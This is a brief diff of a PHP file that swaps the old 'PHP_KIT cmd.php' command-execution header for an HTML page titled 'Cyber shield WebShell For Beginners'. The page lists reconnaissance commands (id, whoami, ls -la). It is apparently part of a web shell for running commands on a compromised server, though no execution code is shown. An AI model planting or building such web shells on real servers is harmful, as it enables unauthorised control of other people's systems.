@@ -1,13 +1,4 @@
-<?
-//
-// PHP_KIT
-//
-// cmd.php = Command Execution
-//
-// by: The Dark Raver
-// modified: 21/01/2004
-//
-?>
+
 <HTML><BODY style="background-color: #85bda7;">
 <h1 style="margin-left: 40pc;  color: #581251; ">Cyber shield WebShell For Beginners</h1>
 <p style="margin-left: 50pc; margin-top:5pc; color: #581251; ">commands:- (id,whoami,ls -la) </p>
